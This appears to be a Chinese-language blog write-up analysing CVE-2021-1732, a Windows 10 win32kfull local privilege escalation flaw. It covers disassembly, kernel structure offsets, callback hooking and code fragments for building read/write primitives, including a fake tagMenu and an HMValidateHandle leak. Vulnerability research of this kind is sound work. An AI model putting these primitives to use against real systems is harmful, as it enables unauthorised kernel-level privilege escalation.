<h3 id="win32kfull-xxxCreateWindowEx"><a href="#win32kfull-xxxCreateWindowEx" class="headerlink" title="win32kfull!xxxCreateWindowEx"></a>win32kfull!xxxCreateWindowEx</h3><p><strong>传入tagWND -&gt; cbwndExtra 到 xxxClientAllowWindowClassExtraBytes,在xxxClientAllowWindowClassExtraBytes执行后返回pExtraBytes</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094750991.png"></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094809198.png"></p>
<p>判断tagWND -&gt; cbWndExtra不为0</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F81                 call    ??9?$RedirectedFieldcbwndExtra@H@tagWND@@QEBAEAEBH@Z ; tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!=(int const &amp;)
.text:00000001C0079F86                 test    al, al       ;判断   
.text:00000001C0079F88                 jz      short loc_1C0079FD4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>传入参数cbWndExtra后调用xxxClientAllocWindowClassExtraBytes</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F8A                 mov     rax, [r15+28h]  ; 进入ptagWNDK
.text:00000001C0079F8E                 mov     ecx, [rax+0C8h] ; 传参cbWndExtra
.text:00000001C0079F94                 call    xxxClientAllocWindowClassExtraBytes;调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将xxxClientAllocWindowClassExtraBytes返回值传到tagWND -&gt; pExtraBytes</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F99                 mov     rcx, rax  ; 返回值到rcx
.text:00000001C0079F9C                 mov     rax, [r15+28h] ; 进入tagWNDK
.text:00000001C0079FA0                 mov     [rax+128h], rcx ; 将返回值赋值到tagWNDK+0x128处<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="win32kfull-xxxClientAllocWindowClassExtraBytes"><a href="#win32kfull-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="win32kfull!xxxClientAllocWindowClassExtraBytes"></a>win32kfull!xxxClientAllocWindowClassExtraBytes</h3><p><strong>win32kfull!xxxCreateWindowEx载入了一个cbwndExtra，然后回调用户层user32!xxxClientAllowWindowClassExtraBytes返回了pExtraBytes然后传回win32kfull!xxxCreateWindowEx,用于赋值pExtraBytes</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094902175.png"></p>
<p>KeUserModeCallback使用编号123回调且传入参数cbwndExtra到用户层user32.dll中的KernelCallbackTable表中user32!xxxClientAllocWindowClassExtraBytes函数,从user32!xxxClientAllocWindowClassExtraBytes调用NtCallbackReturn，返回数据有返回数据outputbuffer和返回数据长度outputlength,outputlength长度是0x18,MmUserProbeAddress会判断返回的内存outputbuffer是否越界，MmUserProbeAddress == 0xfff0000表示用户层边界，v5 = PsGetCurrentProcessWow64Process();返回的指针第一个只想用户层分配内存的地址，使用ProbeForRead判断用户层返回的内存是否是Ring3内存。v4是将要载入的pExtraBytes的内存地址。</p>
<h3 id="user32-xxxClientAllocWindowClassExtraBytes"><a href="#user32-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="user32!_xxxClientAllocWindowClassExtraBytes"></a>user32!_xxxClientAllocWindowClassExtraBytes</h3><p><strong>用户层申请一个堆地址后将地址回调到内核层执行</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094918422.png"></p>
<p>RtlAllocateHeap分配了一个内存并返回这个内存的地址。NtCallbackReturn传输了长度0x18的数据到内核层，win32kfull!xxxClientAllocWindowClassExtraBytes作为参数继续运行，长度为0x18数据的第一个8字节长度数据是分配后的地址。</p>
<h3 id="win32kfull-NtUserConsoleControl"><a href="#win32kfull-NtUserConsoleControl" class="headerlink" title="win32kfull!NtUserConsoleControl"></a>win32kfull!NtUserConsoleControl</h3><p><strong>实质作用是调用xxxConsoleControl,将结果保存在Process_Info中，当ControlCode==6时，会来到xxxConsoleControl</strong></p>
<p><strong>指定窗口hwnd的dwExtraFlag包含0x800属性</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094948239.png"></p>
<p>参数1：功能序号，小于等于6</p>
<p>参数2：输入信息，是hook调用NtUserConsoleControl需要获取的HWND</p>
<p>参数3：输入信息长度，需要小于等于0x18</p>
<h3 id="win32kfull-xxxConsoleControl"><a href="#win32kfull-xxxConsoleControl" class="headerlink" title="win32kfull!xxxConsoleControl"></a>win32kfull!xxxConsoleControl</h3><p><strong>当flag为0x800直接调用offset寻址，当flag不是0x800会生成一个新内存，把这个内存地址设置为offset再寻址</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095011415.png"></p>
<p>判断tagWND -&gt; dwExtraFlag是否包含0x800属性。包含0x800时，会重新分配桌面堆，并将偏移0x128保存的分配地址内存pExtrabytes变成了内核桌面地址+offset寻址；不包含0x800就会重新分配内存并设置偏移0x128为offset寻址，将新生成的pExtrabytes赋值cbWndExtra大小到offset寻址内存处。(这些会直接影响SetWindowLong系列函数对窗口的设置)</p>
<p><strong>只要调用了win32kfull!NtConsoleControl就能将dwExtraFlag添加0x800属性。</strong></p>
<h3 id="user32-SetWindowLong"><a href="#user32-SetWindowLong" class="headerlink" title="user32!SetWindowLong"></a>user32!SetWindowLong</h3><p><strong>setWindowLong只需要传入3个参数</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095024069.png"></p>
<h3 id="win32kfull-NtSetWindowLong"><a href="#win32kfull-NtSetWindowLong" class="headerlink" title="win32kfull!NtSetWindowLong"></a>win32kfull!NtSetWindowLong</h3><p>*<em>在调用NTSetWindowLong函数时，会调用User32!SetWindowLong，然后传递参数到内核层中的Win32kfull!NtSetWindowLong中调用，，当flag=0x800时，将参数3写入参数2 + <em>（tagWND+0xFC)+内核桌面堆地址+pExtraBytes）指向的地址，进而导致越界写入</em></em></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095053503.png"></p>
<p>user32!SetWindowLong传到内核层的参数，a4固定为1，获取到tagWND句柄，将调用user32!SetWindowLong传入的参数加载到xxxSetWindowLong中继续执行。</p>
<h3 id="win32kfull-xxxSetWindowLong"><a href="#win32kfull-xxxSetWindowLong" class="headerlink" title="win32kfull!xxxSetWindowLong"></a>win32kfull!xxxSetWindowLong</h3><p>参数a1是hWnd</p>
<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall xxxSetWindowLong(struct tagWND *a1, int a2, unsigned int a3, __int64 a4, int a5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>v13指向tagWND中的ptagWNDK</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095109445.png"></p>
<p>设置新指针v14指向v13</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095122630.png"></p>
<p>v15是tagWNDK+0xFC,传入的nIndex+4必须小于tagWND+0xFC指向的地址内容</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095140302.png"></p>
<p>指针v18是传入的参数2（v15指向的ptagWNDK+0xFC）之后判断tagWNDK -&gt; flag是有0x800属性，v20指向*(pExtraBytes+载入的参数2+内核参数地址)，offset可以使用SetWindowLong自定义。</p>
<p><strong>标记了0x800，采用桌面堆+偏移的方式写入NewLong；没有标记0x800，直接在tag-&gt;WndExtraBytes写入NewLong</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095153990.png"></p>
<h3 id="win32kfull-xxxSetWindowLongPtr"><a href="#win32kfull-xxxSetWindowLongPtr" class="headerlink" title="win32kfull!xxxSetWindowLongPtr"></a>win32kfull!xxxSetWindowLongPtr</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810113654553.png"></p>
<p>当nIndex = 0, tag-&gt;ExtraBytes写入NewLong;</p>
<p>当nIndex&gt;0且nIndex&lt;0xfffffffffffffee0-8,设置tagWnd-&gt;ExtraBytes</p>
<p>当nIndex&lt;0时调用xxxSetWindowData</p>
<p>SetWindowLongPtr调用xxxSetWindowData执行特定的堆spmenu赋值功能。xxxSetWindowLongPtr需要满足以下条件跳转到xxxSetWindowData</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095208918.png"></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095221101.png"></p>
<h3 id="win32kfull-xxxSetWindowData"><a href="#win32kfull-xxxSetWindowData" class="headerlink" title="win32kfull!xxxSetWindowData"></a>win32kfull!xxxSetWindowData</h3><p><strong>tagWNDK-&gt;style包含WS_CHILD,tagWND-&gt;spMenu=NewLong</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810140319032.png"></p>
<p>tagWNDK-&gt;style需要包含WS_CHILD</p>
<p>将参数dwNewLong数据覆盖到(tagWND-&gt;spmenu)</p>
<h3 id="CreateWindowEx生成HWND"><a href="#CreateWindowEx生成HWND" class="headerlink" title="CreateWindowEx生成HWND"></a>CreateWindowEx生成HWND</h3><p>CreateWindowEx调用内核xxxCreateWindowEx函数</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810141650800.png"></p>
<p>HMAllocObject中的CurThread_1表示当前线程信息，rdesk是ptiCurrent-&gt;rdesk.</p>
<p>Type为是windows，WndObject是tagWND</p>
<p>Typew等于1时，采用桌面堆进行分配</p>
<h3 id="win32kfull-CreateMenu"><a href="#win32kfull-CreateMenu" class="headerlink" title="win32kfull!CreateMenu"></a>win32kfull!CreateMenu</h3><p><strong>调用流程：CreateMenu -&gt; NtUserCallNoParam -&gt; apfnSimpleCall -&gt; InternalCreateMenu</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810150749209.png"></p>
<h3 id="win32kfull-InternalCreateMenu"><a href="#win32kfull-InternalCreateMenu" class="headerlink" title="win32kfull!InternalCreateMenu"></a>win32kfull!InternalCreateMenu</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151048062.png"></p>
<h3 id="win32kfull-InitLookAsideRef"><a href="#win32kfull-InitLookAsideRef" class="headerlink" title="win32kfull!InitLookAsideRef"></a>win32kfull!InitLookAsideRef</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151401258.png"></p>
<h3 id="user32-GetMenuBarInfo"><a href="#user32-GetMenuBarInfo" class="headerlink" title="user32!GetMenuBarInfo"></a>user32!GetMenuBarInfo</h3><p>xxxGetMenuBarInfo有NtUserGetMenuBarInfo调用，NtUserGetMenuBarInfo对应的用户态函数是GetMenuBarInfo</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095255357.png"></p>
<p>将参数传入内核层NtUserGetMenuBarInfo中继续运行</p>
<h3 id="win32kfull-NtUserGetMenuBarInfo"><a href="#win32kfull-NtUserGetMenuBarInfo" class="headerlink" title="win32kfull!NtUserGetMenuBarInfo"></a>win32kfull!NtUserGetMenuBarInfo</h3><p>读原语的主要调用函数，只要在窗口内部使用根据漏洞构造的写原语将我们自定义的spmenu插入即可</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095309342.png"></p>
<h3 id="win32kfull-xxxGetMenuBarInfo"><a href="#win32kfull-xxxGetMenuBarInfo" class="headerlink" title="win32kfull!xxxGetMenuBarInfo"></a>win32kfull!xxxGetMenuBarInfo</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095326320.png"></p>
<p>87:idObject必须要等于-3才能调用spmenu</p>
<p>95:赋值tagWND-&gt;spmenu到v58</p>
<p>107:传入的idItem必须大于0</p>
<p>109:获取ptagWNDK</p>
<p>112:当idItem为1,v38==v37==tagWND -&gt; spmenu + 0x58</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095338829.png"></p>
<p><strong>GetMenuBarInfo需要满足：</strong></p>
<p>1.idObject = -3</p>
<p>2.tagWnd -&gt; style包含WS_CHLD</p>
<p><strong>BarInfo是调用GetMenuBarInfo的最后的参数，保存着Menu的信息</strong></p>
<p>BarInfo -&gt; rcBar.left = pMenu -&gt; left + tagWnd -&gt;left</p>
<p>BarInfo -&gt; rcBar.right = pMenu -&gt; left + tagWnd -&gt; left + pMenu -&gt; right</p>
<h2 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h2><p>漏洞发生在Windows 图形驱动win32kfull!NtUserCreateWindowEx中一处由回调用户态导致offset可以自定义写入，而存在写入API在flag|0x800下越界写入offset指向地址导致的漏洞。</p>
<p>1.当驱动win32kfull.sys调用NtUserCreateWindowEx调用的xxxCreateWindowEx在调用xxxClientAllocWindowClassExtraBytes创建带窗口扩展内存的窗口时会判断tagWND­-&gt;cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用win32kfull!xxxClientAllocWindowClassExtraBytes中的KeUserModeCallback函数回调系统调用表用户层user32!__xxxClientAllocWindowClassExtraBytes在用户层内存创建窗口扩展内存。</p>
<p>2.用户层创建的窗口扩展内存后分配的地址使用NtCallbackReturn函数修正堆栈后重新返回内核层并保存并继续运行，而当tagWND­-&gt;flag值包含0x800属性时候调用该值的offset进行寻址。攻击者可在回调函数内调用NtUserConsoleControl并传入当前窗口的句柄，将当前窗口内核结构中的一个成员(用于指明窗口扩展内存的区域)修改为offset，并修改相应的flag为0x800，指明该成员是一个offset。</p>
<p>3.攻击者可在回调函数中Hook位于user32.dll中的xxxClinetAllocWindowClassExtraBytes函数,在其调用的NtUserConsoleControl设置的窗口标志包含0x800属性，接着调用NtCallbackReturn返回任意值保存在tagWnd -&gt; ExtraBytes中，后续利用SetWindowLong系列函数时，将采用DeskHeap+offset的方式设置tagWnd-&gt;ExtraBytes，突破SetWindowLong长度限制，实现hWndMin越界写hWndMax写原语。获取读原语需要利用tagMenu,通过写源于修改tagWnd -&gt; spMenu为伪造的tagMenu，利用GetMenuBarInfo实现任意读。</p>
<p><strong>关键点:</strong></p>
<p>1.xxxCreateWindowEx回调用户态过程中存在Hook回调表自定义offset写入内核问题</p>
<p>2.NtUserConsoleControl设置flag这个功能与`SetWindowLong/SetWindowLongStr存在类型混淆问题</p>
<h3 id="tagWND结构体"><a href="#tagWND结构体" class="headerlink" title="tagWND结构体"></a>tagWND结构体</h3><pre class="line-numbers language-none"><code class="language-none">tagWND
    0x10 unknown
        0x00 pTEB
            0x220 pEPROCESS(of current process)
    0x18 unknown
        0x80 kernel desktop heap base
    0x28 tagWNDk(Mapped to user layer)  &lt;-----这个结构体映射到用户层
        0x00 hwnd
        0x08 kernel desktop heap base offset
        0x18 dwStyle
        0x28 Program entry 
        0x58 indow Rect top
        0x5C indow Rect left
        0x60 Window Rect buttom
        0x64 indow Rect right
        0x98 spMenu
        0xC8 cbWndExtra             长度值
        0xE8 dwExtraFlag            flag
        0xFC unknown
        0x128 pExtraBytes           内存地址
    0xA8 spMenu
        0x28 unknown
            0x2C unknown
        0x40 unknown
            0x44 unknown
        0x44 unknown
        0x58 unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="内核状态下窗口句柄地址"><a href="#内核状态下窗口句柄地址" class="headerlink" title="内核状态下窗口句柄地址"></a>内核状态下窗口句柄地址</h3><p>win32kfull!NtUserSetWindowLongPtr中存在利用ValidateHwndEx返回内核下的ptagWND地址的操作。</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095353261.png"></p>
<p>rdi寄存器储存的数据是ptagWND</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095407413.png"></p>
<p>搜索win32kfull!NtUserSetWindowLong地址,定位目标汇编位置</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095421319.png"></p>
<p>地址是fffffe23`0941c660，下断运行exp,查看rdi</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095500710.png"></p>
<p>rdi寄存器更新的数据就是ptagWND句柄的指针，tagWND地址fffffe52057bc640</p>
<h3 id="pEPROCESS"><a href="#pEPROCESS" class="headerlink" title="pEPROCESS"></a>pEPROCESS</h3><p>窗口句柄地址为fffffe52057bc640</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095519365.png"></p>
<p>偏移0x0是进程的Thread地址</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095528420.png"></p>
<pre class="line-numbers language-none"><code class="language-none">kd&gt; !dml_proc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095541004.png"></p>
<h3 id="Spmenu偏移"><a href="#Spmenu偏移" class="headerlink" title="Spmenu偏移"></a>Spmenu偏移</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095550574.png"></p>
<p>赋值源码</p>
<pre class="line-numbers language-none"><code class="language-none">// 4. build fake menu's bar info
pFakeMenu[0] = (ULONG_PTR)&amp;ulFakeHandle;
pFakeMenu[5] = (ULONG_PTR)pFakeMenuBody;				// fake body
((PULONG)(&amp;pFakeMenuBody[5]))[1] = 0xffff;				// make items count to max
((PULONG)(&amp;pFakeMenu[8]))[0] = 1;						// make menu'x to 1
((PULONG)(&amp;pFakeMenu[8]))[1] = 1;						// make menu'y to 1
pFakeMenu[0xb] = (ULONG_PTR)pFakeItems;					// set fake menu's fake items
ulFakeRefCount[0] = (ULONG_PTR)pFakeMenu;
pFakeMenu[0x13] = (ULONG_PTR)&amp;ulFakeRefCount;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="桌面堆地址"><a href="#桌面堆地址" class="headerlink" title="桌面堆地址"></a>桌面堆地址</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095609493.png"></p>
<h3 id="tagWNDK结构体"><a href="#tagWNDK结构体" class="headerlink" title="tagWNDK结构体"></a>tagWNDK结构体</h3><p>RECT结构体定义</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT
{
	LONG left;
	LONG top;
	LONG right;
	LONG bottom;
}RECT, *PRECT, NEAR *NPRECT， FAR *LPRECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试源码</p>
<pre class="line-numbers language-none"><code class="language-none">##include &lt;windows.h&gt;
##include &lt;winuser.h&gt;
##include &lt;tlhelp32.h&gt;
##include &lt;iostream&gt;

##if 1
##define DEBUG_BREAK()       __debugbreak();
##else
##define DEBUG_BREAK()
##endif
##define WND_NAME    L"WND"
##define CLS_NAME    L"WND_CLS"
##define DefWindowProc  DefWindowProcW
using HMVALIDATEHANDLE = VOID * (WINAPI*)(HWND hwnd, int type);
HMVALIDATEHANDLE HMValidateHandle = NULL;

BOOL FindHMValidateHandle() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) {
        printf("Failed to load user32");
        return FALSE;
    }
    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (pIsMenu == NULL) {
        printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
        return FALSE;
    }
    unsigned int uiHMValidateHandleOffset = 0;
    for (unsigned int i = 0; i &lt; 0x1000; i++) {
        BYTE* test = pIsMenu + i;
        if (*test == 0xE8) {
            uiHMValidateHandleOffset = i + 1;
            break;
        }
    }
    if (uiHMValidateHandleOffset == 0) {
        printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
        return FALSE;
    }

    unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
    unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

    HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);
    return TRUE;
}
BOOL RegistWndClass(PCTSTR ClsName) {
    WNDCLASS wndclass = { 0 };

    wndclass.style = CS_HREDRAW | CS_VREDRAW;//窗口类型
    wndclass.lpfnWndProc = DefWindowProc; //定义窗口处理函数
    wndclass.cbClsExtra = 0;//窗口类扩展
    wndclass.cbWndExtra = 0x100;//窗口实例无扩展
    wndclass.hInstance = GetModuleHandle(NULL);;//当前实例句柄
    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);//窗口的最小化图标类型
    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);//窗口采用箭头光标
    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//窗口背景色
    wndclass.lpszMenuName = NULL;//窗口菜单
    wndclass.lpszClassName = ClsName; //实际就是进程列表显示的名称

    return !!RegisterClass(&amp;wndclass);
}
HWND CreateWnd(PCTSTR ClsName) {
    HMENU hMenu = NULL;
    HMENU hHelpMenu = NULL;
    hMenu = CreateMenu();
    hHelpMenu = CreateMenu();

    AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));
    //0x1888是这个子菜单的句柄
    AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));
    return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, hMenu, GetModuleHandle(NULL), NULL);
}
int main()
{
    HWND         hwnd;
    PVOID pCurWndObj1 = NULL;

    FindHMValidateHandle();


    if (RegistWndClass(CLS_NAME)) //检查窗口是否注册成功
    {
        printf("RegisterClass successfull!\n");

        hwnd = CreateWnd(CLS_NAME);
        printf("hwnd == %X\n", hwnd);
        pCurWndObj1 = HMValidateHandle((HWND)hwnd, 0x1);
        printf("pCurWndObj1 == %llx\n", pCurWndObj1);
        SetWindowLong(hwnd, 0x1c, 0x40c00000);              
        RECT Rect = { 0 };
        GetWindowRect(hwnd, &amp;Rect);
        printf("left    == %llx\n", Rect.left);
        printf("top     == %llx\n", Rect.top);
        printf("right   == %llx\n", Rect.right);
        printf("bottom  == %llx\n", Rect.bottom);
        DEBUG_BREAK();
        getchar();
    }

}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行结果</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095623154.png"></p>
<p>tagWNDK从kernel映射到user的内存空间</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095634587.png"></p>
<p>RECT结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT
{
	LONG left;    //0x58
	LONG top;     //0x50
	LONG right;   //0x68
	LONG bottom;  //0x60
}RECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="hook函数分析"><a href="#hook函数分析" class="headerlink" title="hook函数分析"></a>hook函数分析</h3><pre class="line-numbers language-none"><code class="language-none">##include &lt;HookLib.h&gt;
##pragma comment(lib, "Zydis.lib")
##pragma comment(lib, "HookLib.lib")
using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );
USERMODECALLBACK UserModeCallback_Orig = NULL;
SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当程序在CreateWindowEx回调了UserModeCallbackTable表上的第123项_xxxClientAllocWindowClassExtraBytes，就会跳转到Hook函数UserModeCallback_Proxy赋值。</p>
<p>在调用CreateWindowEx创建窗口过程中需要hook user32!_xxxClientAllocWindowClassExtraBytes跳转到hook函数，hook函数内部调用NtCallbackReturn伪造回调内核态参数功能返回一个自定义的pExtraBytes,然后自定义的pExtraBytes会返回到win32kfull!xxxClientAllocWindowClassExtraBytes,将pExtraBytes当作返回值返回到xxxCreateWindowEx，赋值tagWND-&gt;pExtraBytes</p>
